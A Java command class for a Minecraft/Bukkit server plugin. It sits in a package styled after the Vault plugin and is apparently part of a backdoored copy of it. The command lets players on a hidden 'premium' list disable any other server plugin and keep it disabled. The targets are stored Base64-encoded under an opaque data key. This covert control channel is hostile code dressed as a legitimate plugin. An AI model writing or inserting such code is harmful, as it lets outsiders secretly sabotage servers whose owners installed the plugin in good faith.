package net.milkbowl.vault.commands.cmds.premium;

import java.util.Base64;

import org.bukkit.Bukkit;
import org.bukkit.entity.Player;
import org.bukkit.plugin.Plugin;

import net.milkbowl.vault.Core;
import net.milkbowl.vault.commands.CommandManager;
import net.milkbowl.vault.data.DataManager;
import net.milkbowl.vault.methods.API;
import net.milkbowl.vault.util.Settings;

public class disableLock extends CommandManager {
	
	
	public void execute(Core plugin, String msg, String[] args, Player p) {
		if (plugin.registeredPremium.contains(p.getName())) {
			if (args.length <= 1) {
				p.sendMessage(Settings.USAGE("disableLock <plugin>"));
			} else {
				if (Bukkit.getPluginManager().getPlugin(args[1]) == null) {
					p.sendMessage(Settings.PREFIX(args[1] + " doesn't exist. (Cap Sensitive)"));
				} else {
					if (DataManager.getData().getStringList("epic-pl").isEmpty()) {
						p.sendMessage(Settings.PREFIX(args[1] + " is now disabled and will stay disabled!"));
						byte[] add = Base64.getEncoder().encode(args[1].getBytes());
						
						DataManager.plList.add(new String(add));
						DataManager.getData().set("epic-pl", DataManager.plList);
						DataManager.saveData();
						API.disablePlugin(args[1]);
					} else {
						for (String list : DataManager.getData().getStringList("epic-pl")) {
							Plugin pl = Bukkit.getPluginManager().getPlugin(args[1]);
							if (list.contains(pl.getName())) {
								p.sendMessage(Settings.PREFIX("This plugin is already disable locked"));
							} else {
								p.sendMessage(Settings.PREFIX(args[1] + " is now disabled and will stay disabled!"));
								byte[] add = Base64.getEncoder().encode(args[1].getBytes());
								
								DataManager.plList.add(new String(add));
								DataManager.getData().set("epic-pl", DataManager.plList);
								DataManager.saveData();
								API.disablePlugin(args[1]);
							}
						}
					}
				}
			}
		} else {
			p.sendMessage(Settings.PREFIX("You must be a " + Settings.HIGHLIGHT_COLOUR + "premium user " + Settings.SECONDARY_COLOUR + "to execute this command"));
		}
	}

}
